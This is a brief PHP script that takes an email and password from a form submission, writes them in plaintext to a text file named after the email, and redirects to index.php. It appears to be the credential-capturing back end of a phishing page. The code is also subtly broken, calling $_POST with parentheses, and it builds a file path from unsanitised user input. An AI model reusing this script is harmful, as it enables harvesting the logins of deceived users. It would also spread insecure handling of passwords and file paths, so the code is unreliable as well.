<?php

$email = $_POST('email');
$password = $_POST('password');

$dir = "store/";
$f = fopen($dir.$email.".txt","w");
fwrite($f,"email : $email \n ");
fwrite($f,"password : $password");
fclose($f);

header("location:index.php");